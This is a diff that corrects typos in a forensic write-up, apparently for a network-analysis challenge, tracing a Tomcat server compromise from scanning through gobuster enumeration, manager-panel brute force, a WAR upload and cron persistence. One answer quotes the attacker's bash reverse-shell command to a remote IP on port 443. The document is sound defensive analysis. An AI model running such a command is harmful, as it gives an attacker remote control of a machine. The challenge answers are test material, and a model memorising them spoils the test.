@@ -17,25 +17,25 @@ For this task i applied filter for tcp syn packets because it is useful for find
 
 ![answer](Q1.png)
 
-We can see from above screenshot that huge number of SYN packets comming from source ip 14.0.0.120 that indicates potential scanning behaviour.
+We can see from above screenshot that huge number of SYN packets coming from source ip 14.0.0.120 that indicates potential scanning behaviour.
 
 ### Answer:- 14.0.0.120
 
 
 ### 2). Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
 
-Use any ip lookup plateforms such as virustotal, ipinfo to gather information about ip addresses,
+Use any ip lookup platforms such as virustotal, ipinfo to gather information about ip addresses,
 
 ![answer](Q2.png)
 
-After searching the identified ip address we can see this ip address is belonged to china.
+After searching the identified ip address we can see this ip address is belongs to china.
 
-### Answer:- china
+### Answer:- China
 
 
 ### 3). From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?
 
-Let's applyu following filter to find http packtes comming from source ip 14.0.0.120,
+Let's apply following filter to find http packtes coming from source ip 14.0.0.120,
 
 #### ip.src == 14.0.0.120 && http
 
@@ -53,7 +53,7 @@ For this task filter for GET requests that comes from soure ip 14.0.0.120 and fi
 
 ![answer](Q4.png)
 
-We can see in user-agent field that lots of requests comming from gobuster and it is well known directory enumeration tool.
+We can see in user-agent field that lots of requests coming from gobuster and it is well known directory enumeration tool.
 
 ### Answer:- gobuster
 
@@ -62,7 +62,7 @@ We can see in user-agent field that lots of requests comming from gobuster and i
 
 ![answer](Q5.png)
 
-We can see intresting directory /manager that looks related to admin panel.
+We can see interesting directory /manager that looks related to admin panel.
 
 ### Answer:- /manager
 
@@ -95,7 +95,7 @@ Inspect the packet and follow TCP stream to find whole conversation,
 
 ![answer](Q8.png)
 
-We can see that attacker use cron jobs to maintaine persistence.
+We can see that attacker use cron jobs to maintain persistence.
 
 ### Answer:- /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
 
@@ -122,7 +122,7 @@ We can see that attacker use cron jobs to maintaine persistence.
 
 ## Incident Summary
 
-In this PCAP investigation a potential network scanning activity performed from source ip 14.0.0.20 later multiple open ports were detected as a result of the attacker's active scan, port 8080 provides access to the web server admin panel and then attacker attempted to enumerate and uncover directories and files on our web server using gobuster and found /manager directory related to admin panel after accessing the admin panel, the attacker tried to brute-force the login credentials and successfully able to loged-in inside the admin panel then attacker attempted to upload a file "JXQOZY.war" with the intent of establishing a reverse shell after successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine using cron jobs.
+In this PCAP investigation a potential network scanning activity performed from source ip 14.0.0.120 later multiple open ports were detected as a result of the attacker's active scan, port 8080 provides access to the web server admin panel and then attacker attempted to enumerate and uncover directories and files on our web server using gobuster and found /manager directory related to admin panel after accessing the admin panel, the attacker tried to brute-force the login credentials and successfully able to logged in inside the admin panel then attacker attempted to upload a file "JXQOZY.war" with the intent of establishing a reverse shell after successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine using cron jobs.
 
 
 --------------------------
